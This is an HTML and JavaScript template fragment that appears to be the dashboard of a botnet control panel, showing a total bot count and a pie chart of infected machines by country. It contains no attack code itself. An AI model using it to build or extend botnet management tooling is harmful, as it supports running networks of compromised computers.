<div  class="demo-charts mdl-color--white mdl-shadow--2dp mdl-cell mdl-cell--12-col mdl-grid" >

<br>
<script>
	$( document ).ready(function() {
	    get_online();
	});
</script>

<div class="demo-charts mdl-shadow--2dp mdl-cell mdl-cell--12-col mdl-grid" style="background-color: #37474f;">	
            <h5 style="color: white;"><i class="material-icons" style="color: white; margin-right: 20px;">poll</i>Total bots: %%PLACE_TOTAL_BOTS_COUNT%%</h5>
</div>
<div class="mdl-cell mdl-cell--6-col">

<script type="text/javascript" src="https://www.google.com/jsapi"></script>
<div>
	<h5>Country statistics</h5>
	<div id="pie-chart"></div>
	<script type="text/javascript">
  	google.load("visualization", "1", {packages:["corechart"]});
	google.setOnLoadCallback(drawCharts);
		function drawCharts() {
			var pieData = google.visualization.arrayToDataTable([
		    ['Country', 'Bots'],
		    %%PLACE_MYDATA_HERE%%
		  ]);
		  // pie chart options
		  var pieOptions = {
		    backgroundColor: 'transparent',
		    pieHole: 0.4,
		    colors: [ "cornflowerblue", 
		              "olivedrab", 
		              "orange", 
		              "tomato", 
		              "crimson", 
		              "purple", 
		              "turquoise", 
		              "forestgreen", 
		              "navy", 
		              "gray","#39ca74","#e54d42","#f0c330","#3999d8","#35485d", "#FE2E2E", "#B40404", "#610B0B", "#FE9A2E", "#B45F04","#3B240B", "#2EFE2E", "#04B404","#0B610B", "#58FAF4", "#04B4AE","#0B615E", "#FA58F4", "#DF01D7","#610B5E", "#F781BE", "#DF0174","#610B38"],
		    pieSliceText: 'value',
		    tooltip: {
		      text: 'percentage'
		    },
		    fontName: 'Open Sans',
		    chartArea: {
		      width: '100%',
		      height: '94%'
		    },
		    legend: {
		      textStyle: {
		        fontSize: 13
		      }
		    }
		  };
		  // draw bar chart twice so it animates
		  var pieChart = new google.visualization.PieChart(document.getElementById('pie-chart'));
  			pieChart.draw(pieData, pieOptions);
		};
  </script>
</div>
</div>